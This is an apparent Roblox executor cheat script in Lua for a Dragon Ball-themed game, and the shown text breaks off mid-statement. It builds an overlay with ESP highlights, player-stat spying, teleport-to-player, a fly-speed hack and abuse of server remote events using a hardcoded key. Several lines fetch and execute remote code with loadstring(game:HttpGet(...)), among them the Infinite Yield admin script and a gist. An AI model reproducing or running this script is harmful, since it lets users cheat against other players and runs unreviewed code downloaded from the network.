while not game:IsLoaded() do wait() end
while not game.Players.LocalPlayer do wait() end
local lplr = game.Players.LocalPlayer
while not lplr.Character do wait() end
local ldata = game.ReplicatedStorage:WaitForChild("Datas"):WaitForChild(lplr.UserId)

local r = math.random(1,2e9) -- This changes when you re-execute, so the gui doesn't stack
_G.AY = r
_G.Fast = false

local t = {"Rebirth","Strength","Speed","Defense","Energy","Zeni"}
for i,a in pairs(t) do
	while not ldata:FindFirstChild(a) do wait() end
end
local users = {""}

local corner = UDim.new(0,5)
-- Functions required for logs
local suffixes = {'','K','M','B','T','qd','Qn'}
function format(val)
	for i=1, #suffixes do
		if tonumber(val) < 10^(i*3) then
			return math.floor(val/((10^((i-1)*3))/100))/(100)..suffixes[i]
		end
	end
end

function format2(n)
	n = tostring(n)
	return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

local sts = {"Strength","Speed","Defense","Energy"}
function getloweststat(plr)
	local data = game.ReplicatedStorage.Datas:WaitForChild(plr.UserId)
	local l = math.huge
	for i,v in pairs(sts) do
		if not data:FindFirstChild(v) then return end
		local st = data[v]
		if st.Value < l then l = st.Value end
	end
	return l
end

local LocalPlayer = game:GetService("Players").LocalPlayer
--Player Info

local DName = game.Players.LocalPlayer.DisplayName  -- PlayerInfo Display Name
local Name = game.Players.LocalPlayer.Name -- Name
local Userid = game.Players.LocalPlayer.UserId -- UserId

-- Load the character in
if lplr.PlayerGui:FindFirstChild("Start") then
	game:GetService("ReplicatedStorage").Package.Events.Start:InvokeServer()
	if workspace.Others:FindFirstChild("Title") then
		workspace.Others.Title:Destroy();
	end;
	local cam = game.Workspace.CurrentCamera;
	cam.CameraType = Enum.CameraType.Custom;
	cam.CameraSubject = lplr.Character.Humanoid;
	_G.Ready = true
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true);
	lplr.PlayerGui:WaitForChild("Main").Enabled = true
	if lplr.PlayerGui:FindFirstChild("Start") then
		lplr.PlayerGui.Start:Destroy()
	end
    lplr.PlayerGui.Main.bruh.Enabled = false
    lplr.PlayerGui.Main.bruh.Enabled = true
end

-- Load IY
spawn(function()
	if getgenv().IY_LOADED ~= true then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end
end)

-- Begin basic functions
local NPCs = workspace:WaitForChild("Others"):WaitForChild("NPCs")
c = nil
local rainbows = {} -- {Object, Color Property}
local rainbows2 = {}
spawn(function()
	while _G.AY == r do
		for i = 1,6 do 
			if i == 1 then c = Color3.new(1,0,0)
			elseif i == 2 then c = Color3.new(1,1,0)
			elseif i == 3 then c = Color3.new(0,1,0)
			elseif i == 4 then c = Color3.new(0,1,1)
			elseif i == 5 then c = Color3.new(0,0,1)
			elseif i == 6 then c = Color3.new(1,0,1)
			end
			for a,v in pairs(rainbows) do
				game:GetService("TweenService"):Create(v[1], TweenInfo.new(1), {[v[2]] = c}):Play()
			end
			wait(1)
		end
		wait()
	end
end)
spawn(function()
	while _G.AY == r do
		for a,v in pairs(rainbows2) do
			game:GetService("TweenService"):Create(v[1], TweenInfo.new(.1), {[v[2]] = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))}):Play()
			task.wait()
		end
		wait(.1)
	end
end)

--GUI
local vL = lplr.PlayerGui:WaitForChild("Main"):WaitForChild("Version") 
vL.Visible = false 

--local guilocation = game.CoreGui
local guilocation = game.Players.LocalPlayer.PlayerGui
if guilocation:FindFirstChild("StatsGUI") then guilocation.StatsGUI:Destroy() end
local scgui = Instance.new("ScreenGui")
scgui.Parent = game.CoreGui
scgui.DisplayOrder = math.huge
local espdirectory = Instance.new("Folder")
espdirectory.Name = "ESPs"
espdirectory.Parent = scgui
scgui.ResetOnSpawn = false
scgui.Name = "StatsGUI"
local colortheme = Color3.new(.1,.1,.1)

-- Frames
local fr = Instance.new("Frame") -- This holds the playerlist frame
fr.Parent = scgui
fr.Name = "fr"
fr.BackgroundColor3 = colortheme --Color3.new(.2,.2,.2)
fr.BackgroundTransparency = 1
fr.AnchorPoint = Vector2.new(1,0)
fr.Position = UDim2.new(1.16,-5,.05,0)
fr.Size = UDim2.new(.15,0,0,40*18)
fr.BorderSizePixel = 0

local fr12 = Instance.new("Frame") -- Playerlist goes here
fr12.Parent = fr
fr12.Name = "fr12"
fr12.BackgroundColor3 = Color3.new(1,1,1) --Color3.new(.2,.2,.2)
fr12.BorderSizePixel = 3
fr12.BackgroundTransparency = 0
local layout12 = Instance.new("UIGridLayout") -- Organizes the players
layout12.Parent = fr12
layout12.CellPadding = UDim2.new(0,0,0,5) --
layout12.SortOrder = Enum.SortOrder.LayoutOrder
local stroke1 = Instance.new("UIStroke")
stroke1.Parent = fr12
stroke1.Thickness = 2
local corner1 = Instance.new("UICorner")
corner1.Parent = fr12
corner1.CornerRadius = corner
local UIGradient = Instance.new("UIGradient")
UIGradient.Parent = fr12
UIGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(20,20,20)),
	ColorSequenceKeypoint.new(.5, Color3.fromRGB(50,50,50)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(20,20,20)),
}
--
local Grad = UIGradient
local frames = 60
local speed = 0.01

function colour_change(colour1, colour2, colour3)
	local originalColour1 = Grad.Color.Keypoints[1].Value
	local originalColour2 = Grad.Color.Keypoints[2].Value
	local originalColour3 = Grad.Color.Keypoints[3].Value

	for i=frames,0,-1 do
		wait(speed)

		local x = math.sqrt((i-frames)^2)/frames

		Grad.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0,originalColour1:Lerp(colour1, x)),
			ColorSequenceKeypoint.new(.5,originalColour2:Lerp(colour2, x)),
			ColorSequenceKeypoint.new(1,originalColour3:Lerp(colour3, x)),

		}


	end
end
-- pink blue purple 
task.spawn(function()
	while c == nil do wait() end
	while scgui do
		colour_change(Color3.new(.1,.1,.1), Color3.new(.7,0,0), Color3.new(.1,.1,.1))
		colour_change(Color3.new(.1,.1,.1), Color3.new(0,.7,0), Color3.new(.1,.1,.1))
		colour_change(Color3.new(.1,.1,.1), Color3.new(0,0,.7), Color3.new(.1,.1,.1))
        task.wait()
	end
end)
--

UIGradient.Rotation = 45

layout12.CellSize = UDim2.new(1,0,0,30)--1/(#fr12:GetChildren()-2),0)

local fr2fade = Instance.new("Frame")
fr2fade.Parent = scgui
fr2fade.Position = UDim2.new(.75,-5,.05,-4)
fr2fade.Size = UDim2.new(.1,0,.7,4)
fr2fade.BackgroundTransparency = 1
fr2fade.ClipsDescendants = true
fr2fade.Name = "fr2back"
local fr2 = Instance.new("Frame") -- Normal Buttons go here
fr2.Parent = fr2fade
fr2.Name = "fr2"
fr2.ZIndex = -2
fr2.BackgroundColor3 = colortheme--Color3.new(.2,.2,.2)
--fr2.AnchorPoint = Vector2.new(1,0)
fr2.Position = UDim2.new(1,4,0,4)
fr2.BorderSizePixel = 3
fr2.BackgroundTransparency = 0.1
fr2.Visible = true
fr2.ClipsDescendants = true
local layout2 = Instance.new("UIGridLayout") -- Organizes the players
layout2.Parent = fr2
layout2.CellPadding = UDim2.new(0,0,0,4)
layout2.CellSize = UDim2.new(1,0,0,20)

layout2.SortOrder = "LayoutOrder"
local stroke2 = Instance.new("UIStroke")
stroke2.Parent = fr2
stroke2.Thickness = 2
local corner2 = Instance.new("UICorner")
corner2.Parent = fr2
corner2.CornerRadius = corner

local fr3 = Instance.new("Frame") -- Third Frame, holds lplr buttons
fr3.Parent = scgui
fr3.Name = "fr3"
fr3.ZIndex = -4
fr3.BackgroundTransparency = 0
fr3.BorderSizePixel = 0
fr3.BackgroundColor3 = colortheme
fr3.Position = UDim2.new(.31,0,1,5)
--fr3.Visible = true
local layout3 = Instance.new("UIGridLayout")
layout3.Parent = fr3
layout3.SortOrder = "LayoutOrder"
layout3.CellPadding = UDim2.new(0,0,0,5)
layout3.CellSize = UDim2.new(1,0,0,20)
layout3.HorizontalAlignment = "Center"
local corner3 = Instance.new("UICorner")
corner3.Parent = fr3
corner3.CornerRadius = corner
local stroke3 = Instance.new("UIStroke")
stroke3.Parent = fr3
stroke3.ApplyStrokeMode = "Border"
stroke3.Thickness = 2

local fr32 = Instance.new("Frame", scgui) -- Holds teleports
fr32.Name = "fr32"
fr32.ZIndex = -4
fr32.BackgroundTransparency = 0
fr32.BorderSizePixel = 0
fr32.BackgroundColor3 = colortheme
fr32.Visible = false
local layout32 = Instance.new("UIGridLayout")
layout32.Parent = fr32
layout32.SortOrder = "LayoutOrder"
layout32.CellPadding = UDim2.new(0,0,0,5)
layout32.CellSize = UDim2.new(1,0,0,20)
layout32.HorizontalAlignment = "Center"
local corner32 = Instance.new("UICorner")
corner32.Parent = fr32
corner32.CornerRadius = corner
local stroke32 = Instance.new("UIStroke")
stroke32.Parent = fr32
stroke32.ApplyStrokeMode = "Border"
stroke32.Thickness = 2

local srvrs = Instance.new("TextButton")
srvrs.Parent = scgui

function rainbow(object, property, which)
	if not object:FindFirstChild(property.."_Rainbow") then
		local a = Instance.new("BoolValue")
		a.Parent = object
		a.Name = property.."_Rainbow"
		table.insert(which, {object, property})
	end
end

local buttons = { -- Frame, ButtonName, Class, BG Color, Txt Color
	-- "R" = Rainbow
	-- All buttons will become colortheme with an outline
	{2,"Display","TextLabel",},
	{2,"HP","TextLabel",},
	{2,"Formlbl","TextLabel",},
	{2,"Quest","TextLabel",},
	{2,"Fusion","TextLabel",},
	{2,"Zeni","TextLabel",},
	{2,"Copy Stats","TextButton", Color3.new(.15,.15,.15), Color3.new(1,1,1)},
	{2,"View","TextButton", Color3.new(.15,.15,.15),"R"},
	{2,"Teleport","TextButton", Color3.new(.15,.15,.15),"R"},
	{3,"Ping","TextLabel", nil,"R"},
	{3,"FlySpeed","TextBox", "R",Color3.new(1,1,1)},
	{3,"Suicide","TextButton", Color3.new(0,0,0), Color3.new(1,0,0)},
	{3,"Abbreviate","TextButton", Color3.new(.15,.15,.15)},
	{3,"ESPHighlight","TextButton", Color3.new(.15,.15,.15)},
	{3,"ESPLabels","TextButton", Color3.new(.15,.15,.15)},
	{3,"Stack","TextButton", Color3.new(.15,.15,.15)},
	{3,"Block","TextButton", Color3.new(.15,.15,.15)},
}

function addbutton(button)
	local lbl = Instance.new(button[3])
	lbl.TextScaled = false
	if button[1] == 2 then
		lbl.Parent = fr2
		lbl.TextSize = 15
	elseif button[1] == 3 then
		lbl.Parent = fr3
		lbl.TextSize = 15
	elseif button[1] == 4 then
		lbl.Parent = fr32
		lbl.TextXAlignment = "Left"
	end
	lbl.ZIndex = lbl.Parent.ZIndex + 1
	lbl.Name = button[2]
	lbl.BackgroundTransparency = .5
	if button[3] ~= "TextLabel" then
		lbl.Text = button[2]
	else 
		lbl.BackgroundTransparency = 1
	end
	lbl.Font = Enum.Font.Code
	lbl.BorderSizePixel = 0
	if button[4] then
		if button[4] == "R" then
			rainbow(lbl, "BackgroundColor3",rainbows)
		else
			lbl.BackgroundColor3 = button[4]
		end
	else
		lbl.BackgroundColor3 = colortheme
	end
	lbl.TextColor3 = Color3.new(1,1,1)
	if button[5] then
		if button[5] == "R" then
			rainbow(lbl, "TextColor3",rainbows)
		else 
			lbl.TextColor3 = button[5]
		end
	end
	lbl.LayoutOrder = i
	local corner = Instance.new("UICorner")
	corner.Parent = lbl
	--corner.CornerRadius = corner
	return lbl
end

for i,button in pairs(buttons) do
	addbutton(button)
end

local b = Instance.new("TextButton")--addbutton({4, "Beerus", "TextButton", Color3.new(.5,0,.5)})
b.Parent = scgui
b.Name = "TP_Beerus"
b.Size = UDim2.new(.017,0,0,30)
b.Position = UDim2.new(.95,0,-.1,0)
b.BackgroundColor3 = colortheme
b.BackgroundTransparency = .5
b.Font = Enum.Font.Gotham
b.TextStrokeTransparency = 1
b.TextSize = 30
local bcorner = Instance.new("UICorner")
bcorner.Parent = b
bcorner.CornerRadius = UDim.new(0,5)

srvrs.Size = UDim2.new(.017,0,0,30)
srvrs.Position = UDim2.new(.93,5,-.1,0)
srvrs.BackgroundColor3 = Color3.new(.1,.1,.1)
srvrs.BackgroundTransparency = .5
srvrs.TextColor3 = Color3.new(1,0,0)
srvrs.TextStrokeTransparency = 1
srvrs.BorderSizePixel = 0
srvrs.TextScaled = true
srvrs.Text = "S"
srvrs.Activated:Connect(function()
	pcall(function()
		game.CoreGui["ServerBrowser"]:Destroy()
	end)
	loadstring(game:HttpGet('https://gist.githubusercontent.com/JellyJrl/894aec3c4cbf7a698339515656be7af9/raw/serverlist'))()
end)
local scorner = Instance.new("UICorner")
scorner.Parent = srvrs
scorner.CornerRadius = UDim.new(0,5)

local job = Instance.new("TextLabel")--addbutton({4, "Beerus", "TextButton", Color3.new(.5,0,.5)})
job.Parent = scgui
job.Name = "JobId"
job.Size = UDim2.new(.1225,0,0,30)
job.Position = UDim2.new(.8,0,-.1,0)
job.BackgroundColor3 = colortheme
job.BackgroundTransparency = .5
job.Font = Enum.Font.Gotham
job.TextStrokeTransparency = 1
job.TextColor3 = Color3.new(1,1,1)
job.TextScaled = true
job.TextSize = 30
job.Text = game.JobId
local jobcorner = Instance.new("UICorner")
jobcorner.Parent = job
jobcorner.CornerRadius = UDim.new(0,5)

if game.Workspace.Others.NPCs:FindFirstChild("Kid Nohag") then
	b.Text = "B"
	b.TextColor3 = Color3.new(1,0,1)
	b.Activated:Connect(function()
		game.ReplicatedStorage.Package.Events.TP:InvokeServer("Vills Planet")
	end)
else 
	b.Text = "E"
	b.TextColor3 = Color3.new(0,1,0)
	b.Activated:Connect(function()
		game.ReplicatedStorage.Package.Events.TP:InvokeServer("Earth")
	end)
end

fr32.Size = UDim2.new(.1,0,0,25*(#fr32:GetChildren()-3)-5)


local display = fr2.Display
local hp = fr2.HP
local quest = fr2.Quest
local zeni = fr2.Zeni
local fusion = fr2.Fusion
local formlbl = fr2.Formlbl
local CopyStats = fr2["Copy Stats"]
local View = fr2.View
local Teleport = fr2.Teleport
local pingL = fr3.Ping
local espH = fr3.ESPHighlight
local espL = fr3.ESPLabels
local Block = fr3.Block
local Abbreviate = fr3.Abbreviate
local Suicide = fr3.Suicide
local SpeedBox = fr3.FlySpeed
local Stack = fr3.Stack

L2_Offset = layout2.CellSize.Y.Offset
L2_Cushion = layout2.CellPadding.Y.Offset
fr2.Size = UDim2.new(1,-4,0,((L2_Offset+L2_Cushion)*(#fr2:GetChildren()-3))-5)

fr3.Size = UDim2.new(.1,0,0,(25*(#fr3:GetChildren()-3))-5)
fr32.Position = UDim2.new(.75,0,1,(-25*(#fr32:GetChildren()-3)+5)) -- Starting position, slides down

formlbl.Text = "Not Fused"

local f3p = fr3.Position -- Original Position
fr3.MouseEnter:Connect(function()
	game:GetService("TweenService"):Create(fr3, TweenInfo.new(.2), {Position = f3p + UDim2.new(0,0,0,-(25*(#fr3:GetChildren()-3)))}):Play()
end)
fr3.MouseLeave:Connect(function()
	game:GetService("TweenService"):Create(fr3, TweenInfo.new(.2), {Position = UDim2.new(.31,0,1,-20)}):Play()
end)
-- rainbow(object, property which)
rainbow(stroke1, "Color", rainbows)
rainbow(stroke2, "Color", rainbows)
rainbow(stroke3, "Color", rainbows)
rainbow(stroke32, "Color", rainbows)

--[[Teleport.Activated:Connect(function()
    local targetp = targetval.Value
    if targetp ~= nil and targetp ~= lplr and targetp.Character then
        local targetc = targetp.Character
        if not (targetc and lplr.Character) then return end
        local hrp = lplr.Character:FindFirstChild("HumanoidRootPart")
        if targetc:FindFirstChild("Head") and hrp then
            hrp.CFrame = targetc.Head.CFrame * CFrame.new(0,3,0)
            hrp.Velocity = Vector3.new(0,0,0)
            lplr.Character.Humanoid:ChangeState(14)
        end
    end
end)]]

Stack.MouseButton1Up:Connect(function()
	local form = lplr.Status:WaitForChild("Transformation").Value
	if form ~= "None" then
		game:GetService("ReplicatedStorage").Package.Events.equipskill:InvokeServer(form)
		game:GetService("ReplicatedStorage").Package.Events.ta:InvokeServer()
		-- unform
	end
	lplr.Character:BreakJoints()
	task.wait(5)

	game:GetService("ReplicatedStorage").Package.Events.equipskill:InvokeServer("Godly SSJ2")
	game:GetService("ReplicatedStorage").Package.Events.ta:InvokeServer()
	
	if ldata.Allignment.Value == "Evil" then
		game:GetService("ReplicatedStorage").Package.Events.equipskill:InvokeServer("Ultra Ego")
	else
		game:GetService("ReplicatedStorage").Package.Events.equipskill:InvokeServer("SSJBUI")
	end
	game:GetService("ReplicatedStorage").Package.Events.ta:InvokeServer()
end)

--Flyspeed
SpeedBox.FocusLost:Connect(function()
	if tonumber(SpeedBox.Text) then
		while tonumber(SpeedBox.Text) and _G.AY == r and task.wait() do
			while not lplr.Character:FindFirstChild("HumanoidRootPart") do wait() end
			local s = tonumber(SpeedBox.Text)
			if _G.Fast == true then
				lplr.Character.HumanoidRootPart.Anchored = false
				if s < 1e6 then -- If number is below 1M do that sps, otherwise do that stat speed
					getrenv()._G.FlightSpeed = s
					lplr.Character.Humanoid.WalkSpeed = s/1.5
				else
					getrenv()._G.FlightSpeed = 150 + (s^.2)
					lplr.Character.Humanoid.WalkSpeed = 150 + ((s^.2)/1.5)
				end
			end
		end
	else
		SpeedBox.Text = "FlySpeed"
	end
end)

CopyStats.Activated:Connect(function()
	if game.Players:FindFirstChild(targetval.Value.Name) then
		local plr = targetval.Value
		local data = game.ReplicatedStorage.Datas:WaitForChild(plr.UserId)
		local nam = "("..plr.Name..", "..plr.DisplayName..")"
		if plr.Name == plr.DisplayName then
			nam = "("..plr.Name..")"
		end
		local stats = (data.Strength.Value + data.Speed.Value + data.Defense.Value + data.Energy.Value) / 4
		local numt = format(stats)
		local zeni = format(data.Zeni.Value)
		local rebs = data.Rebirth.Value
		local rebst = "("..rebs..")"
		local txt = rebst.." "..nam..", "..numt..", "..zeni..""
		for i,v in pairs(A) do
			if rebs >= v[1] then
				txt = "["..v[2].."] "..txt
				break
			end
		end
		for i,v in pairs(StatFormats) do
			if getloweststat(plr) >= v[1] then
				txt = v[2].." "..txt
				break
			end
		end
		setclipboard(txt)
	end
end)

_G.Down = nil
Teleport.MouseButton1Down:Connect(function()
	_G.Down = "One"
end)
Teleport.MouseButton1Up:Connect(function()
	_G.Down = nil
end)

function Mel()
local lplr = game.Players.LocalPlayer

local moves = { 
    "Super Dragon Fist", "God Slicer", "Spirit Barrage", "Mach Kick", "Wolf Fang Fist", 
    "High Power Rush", "Meteor Strike", "Meteor Charge", "Spirit Breaking Cannon", 
    "Vital Strike", "Flash Kick", "Vanish Strike", "Uppercut", "Sledgehammer", "Rock Impact" 
}

for _, move in ipairs(moves) do
    if not lplr:FindFirstChild("Status"):FindFirstChild(move) then
        game:GetService("ReplicatedStorage").Package.Events.mel:InvokeServer(move, "Blacknwhite27")
        game.ReplicatedStorage.Package.Events.voleys:InvokeServer("Energy Volley", {FaceMouse = false, MouseHit = CFrame.new()}, "Blacknwhite27")               
        game:GetService("ReplicatedStorage").Package.Events.cha:InvokeServer("Blacknwhite27")            
    end
end
end

spawn(function()
	while _G.AY == r do
		task.spawn(function()
			if _G.Down then
				local targetp = targetval.Value -- Player value
				if targetp ~= nil and targetp ~= lplr then
					local data = game.ReplicatedStorage:WaitForChild("Datas"):WaitForChild(targetp.UserId)
					local targetc = targetp.Character
					if not (targetc and lplr.Character) then task.wait() return end
					local hrp = lplr.Character:FindFirstChild("HumanoidRootPart")
					--task.spawn(function()
						if ldata.Quest.Value ~= data.Quest.Value and data.Quest.Value ~= "" then
							game:GetService("ReplicatedStorage").Package.Events.Qaction:InvokeServer(game.Workspace.Others.NPCs[data.Quest.Value])
							lplr.PlayerGui.Main.MainFrame.Frames.Quest.Visible = false
						end
					--end)
					task.spawn(function()
						if targetc:FindFirstChild("HumanoidRootPart") and hrp then
							if _G.Down == "One" then
								hrp.CFrame = targetc.HumanoidRootPart.CFrame * CFrame.new(0,0,3)
								Mel()
							end
							hrp.Velocity = Vector3.new(0,0,0)
							lplr.Character.Humanoid:ChangeState(14)
						end
					end)
				end
			end
		end)
		task.wait()
	end
end)

local togglescgui = scgui.Parent:FindFirstChild("togglescgui") or Instance.new("ScreenGui")
togglescgui.Parent = scgui.Parent
togglescgui.Name = "togglescgui"
local ToggleGuiButton = scgui.Parent:FindFirstChild("ToggleGuiButton") or Instance.new("TextButton")--addbutton({4, "Beerus", "TextButton", Color3.new(.5,0,.5)})
ToggleGuiButton.Parent = togglescgui
ToggleGuiButton.Name = "ToggleGuiButton"
ToggleGuiButton.Size = UDim2.new(.05,0,0,30)
ToggleGuiButton.Position = UDim2.new(.2,0,0,-31)
ToggleGuiButton.BackgroundColor3 = colortheme
ToggleGuiButton.BackgroundTransparency = .5
ToggleGuiButton.Font = Enum.Font.Gotham
ToggleGuiButton.TextStrokeTransparency = 1
ToggleGuiButton.TextColor3 = Color3.new(1,1,1)
ToggleGuiButton.TextScaled = true
ToggleGuiButton.TextSize = 30
ToggleGuiButton.Text = "Hide GUI"
ToggleGuiButton.TextColor3 = Color3.new(1,1,1)
local toggleguicorner = Instance.new("UICorner")
toggleguicorner.Parent = ToggleGuiButton
toggleguicorner.CornerRadius = UDim.new(0,5)

ToggleGuiButton.Activated:Connect(function()
	if scgui.Enabled == true then  -- If visible, and want to hide
		pcall(function()
			find_iy().Enabled = false
		end)
		scgui.Enabled = false
		vL.Visible = true
		ToggleGuiButton.Text = "Show GUI"
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,true)

	elseif scgui.Enabled == false then -- If hiding, and want to show
		scgui.Enabled = true
		pcall(function()
			find_iy().Enabled = true
		end)
		vL.Visible = false
		ToggleGuiButton.Text = "Hide GUI"
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
	end
end)

Suicide.MouseButton1Up:Connect(function()
    lplr.Character.UpperTorso:Destroy()
end)

local Viewing = Instance.new("ObjectValue")
Viewing.Parent = scgui
Viewing.Changed:Connect(function(val)
	if val == nil then return end
	local tplr = val
	while Viewing.Value == tplr and task.wait() and _G.AY == r do
		if s == lplr then Viewing.Value = nil return end
		while not tplr.Character do wait() end
		game.Workspace.CurrentCamera.CameraSubject = tplr.Character:WaitForChild("Humanoid")
	end
	if lplr.Status.Fused.Value == "None" then
		game.Workspace.CurrentCamera.CameraSubject = lplr.Character:WaitForChild("Humanoid")
	else
		game.Workspace.CurrentCamera.CameraSubject = game.Players[lplr.Status.Fused.Value].Character:WaitForChild("Humanoid")
	end
end)

View.Activated:Connect(function()
	local tplr = targetval.Value
	local v = Viewing.Value
	if Viewing.Value ~= tplr and tplr ~= lplr then -- If not viewing plr, and isn't lplr
		Viewing.Value = tplr
		View.Text = "UnView"
	elseif Viewing.Value == tplr and tplr ~= lplr then -- If alr viewing plr, and isnt lplr
		Viewing.Value = nil
		View.Text = "View"
	elseif Viewing.Value ~= tplr and tplr == lplr then -- If not viewing yourself
		Viewing.Value = nil
		View.Text = "Viewing Yourself"
	elseif Viewing.Value == tplr and tplr == lplr then -- You're already viewing yourself
	end
end)

function getchr(plr)
	return plr.Character
end

-- ESPh
_G.esph = false
if _G.esph == true then
	espH.Text = "Disable ESPH"
else
	espH.Text = "Enable ESPH"
end

function ESPH()
	if _G.esph == true then
		_G.esph = false
		espH.Text = "Enable ESPH"
		for i,gui in pairs(espdirectory:GetChildren()) do
			--gui.Enabled = false
			gui.Highlight.Enabled = false
		end
	elseif _G.esph == false then
		_G.esph = true
		espH.Text = "Disable ESPH"
		for i,gui in pairs(espdirectory:GetChildren()) do
			--gui.Enabled = true
			gui.Highlight.Enabled = true
		end
	end
end
espH.MouseButton1Up:Connect(function()
	ESPH()
end)

-- ESPh
_G.espl = true
if _G.esp == true then
	espL.Text = "Disable ESPL"
else
	espL.Text = "Enable ESPL"
end

function ESPL()
	if _G.espl == true then
		_G.espl = false
		espL.Text = "Enable ESPL"
		for i,gui in pairs(espdirectory:GetChildren()) do
			gui.Enabled = false
			--gui.Highlight.Enabled = false
		end
	elseif _G.espl == false then
		_G.espl = true
		espL.Text = "Disable ESPL"
		for i,gui in pairs(espdirectory:GetChildren()) do
			gui.Enabled = true
			--gui.Highlight.Enabled = true
		end
	end
end
espL.MouseButton1Up:Connect(function()
	ESPL()
end)

--Stat abbreviations
_G.Abv = false
if _G.Abv == true then
	Abbreviate.Text = "UnAbbreviate"
else 
	Abbreviate.Text = "Abbreviate"
end
function abv()
	if _G.Abv == false then
		_G.Abv = true
		Abbreviate.Text = "UnAbbreviate"
	else 
		_G.Abv = false
		Abbreviate.Text = "Abbreviate"
	end
end
Abbreviate.MouseButton1Up:Connect(function()
	abv()
end)

--Block
function block()
	if not (lplr.Character and lplr.Status:FindFirstChild("Blocking")) then return end
	game:GetService("ReplicatedStorage").Package.Events.block:InvokeServer(true)
end
Block.MouseButton1Up:Connect(function()
	block()
end)

targetval = Instance.new("ObjectValue")-- This will change when you click on a player's label, and open frame 2
targetval.Changed:Connect(function()
	if _G.AY ~= r then return end
	if targetval.Value ~= nil then
		if Viewing.Value ~= targetval.Value and targetval.Value ~= lplr then
			View.Text = "View"
		elseif Viewing.Value == targetval.Value and targetval.Value ~= lplr then
			View.Text = "UnView"
		elseif Viewing.Value == nil and targetval.Value == lplr then
			View.Text = "Viewing Yourself"
		elseif Viewing.Value ~= targetval.Value and targetval.Value == lplr then
			View.Text = "View Yourself"
		end
	end
	local target = targetval.Value
	local plr = target
	if target ~= nil then
		game:GetService("TweenService"):Create(fr2, TweenInfo.new(.3), {Position = UDim2.new(0,2,0,4)}):Play()
		local data = game.ReplicatedStorage.Datas:WaitForChild(target.UserId)
		while target == targetval.Value and game.Players:FindFirstChild(target.Name) and _G.AY == r do
			if not target.Character then
				for i,plr in pairs(game.Players:GetChildren()) do -- Looks for all characters that exist 
					-- If this is a plr chr, and has fusion value, 
					if plr:WaitForChild("Status"):FindFirstChild("Fused") then
						if plr.Status.Fused.Value == target.Name then
							hp.Text = "Fused with "..plr.Name
							fusion.Text = "Fused with "..plr.Name
						end 
					end 
				end 
			elseif target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character:FindFirstChild("Humanoid") then
				local st = plr:FindFirstChild("Status")
				if st then
					local fused = st.Fused.Value
					if fused ~= "None" and workspace.Living:FindFirstChild(fused) then -- If not unfused, and this value is a string
						hp.Text = "Fused with "..fused
					else
						hp.Text = "HP: "..format(target.Character.Humanoid.Health).."/"..format(target.Character.Humanoid.MaxHealth)
					end
					if fused ~= "None" then
						fusion.Text = "Fused with "..fused
					else
						fusion.Text = "Not Fused"
					end
					local form = plr.Status:WaitForChild("Transformation").Value
					if form ~= "None" then
						formlbl.Text = form
					else 
						formlbl.Text = "No Form"
					end
				else
					hp.Text = "HP: "..format(target.Character.Humanoid.Health).."/"..format(target.Character.Humanoid.MaxHealth)
					fusion.Text = "Not loaded"
					formlbl.Text = "Not loaded"
				end
			end
			--"<b><font color='rgb(0,0,0)'>", "</font></b>"
			display.RichText = true
			display.Text = target.Name
			display.TextColor3 = Color3.new(1,0,0)
			if data.Allignment.Value == "Good" then
				display.TextColor3 = Color3.fromRGB(150,150,255)
			end
			zeni.Text = "Zeni: "..format(data.Zeni.Value)
			local qval = data.Quest.Value
			if qval == "" then
				quest.Text = "No Quest"
			else
				quest.Text = "Quest: "..qval
			end
			task.wait()
		end
	else 
		game:GetService("TweenService"):Create(fr2, TweenInfo.new(.3), {Position = UDim2.new(1,4,0,4)}):Play()
		wait(.3)
	end
end)

local numplrs = Instance.new("TextLabel")
numplrs.Parent = scgui
numplrs.Size = UDim2.new(.4,0,0,36)
numplrs.Position = UDim2.new(.3,0,-.1,0)
numplrs.BackgroundTransparency = 1
numplrs.Font = Enum.Font.Gotham
numplrs.TextColor3 = Color3.new(1,1,1)
numplrs.TextStrokeColor3 = Color3.new(.2,.2,.2)
numplrs.TextStrokeTransparency = 0
numplrs.TextSize = 30

local formmastery = Instance.new("TextLabel")
formmastery.Parent = scgui
formmastery.Size = UDim2.new(.04,0,0,36)
formmastery.Position = UDim2.new(.55,0,-.1,0)
formmastery.BackgroundTransparency = 1
formmastery.Font = Enum.Font.Gotham
formmastery.TextColor3 = Color3.new(1,1,1)
formmastery.TextStrokeColor3 = Color3.new(.2,.2,.2)
formmastery.TextStrokeTransparency = 0
formmastery.TextSize = 15

function find_iy()
	for i,v in pairs(game.CoreGui:GetDescendants()) do
		if v:FindFirstChild("SettingsButton") then
			return v:FindFirstAncestorOfClass("ScreenGui")
		end
	end
end

-- Key Inputs
local UIS = game:GetService("UserInputService")
UIS.InputBegan:Connect(function(key)
	if _G.AY ~= r then return end
	if key.KeyCode == Enum.KeyCode.KeypadOne then -- Disable ESP and the gui
		if scgui.Enabled == true then 
			pcall(function()
				find_iy().Enabled = false
			end)
			scgui.Enabled = false
			vL.Visible = true
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,true)
		elseif scgui.Enabled == false then 
			scgui.Enabled = true
			pcall(function()
				find_iy().Enabled = true
			end)
			vL.Visible = false
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
		end
	end
	if key.KeyCode == Enum.KeyCode.KeypadTwo then block() end -- Block
	if key.KeyCode == Enum.KeyCode.KeypadSeven then abv() end -- Abbreviate
	if key.KeyCode == Enum.KeyCode.KeypadEight then ESPL()  end -- ESP Labels
	if key.KeyCode == Enum.KeyCode.KeypadNine then ESPH()  end -- ESP Highlights
	if key.KeyCode == Enum.KeyCode.LeftShift then _G.Fast = true  end -- Fast Fly
	if key.KeyCode == Enum.KeyCode.X then
		if lplr.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame:WaitForChild("ChatBar"):IsFocused() then return end
		charging = true
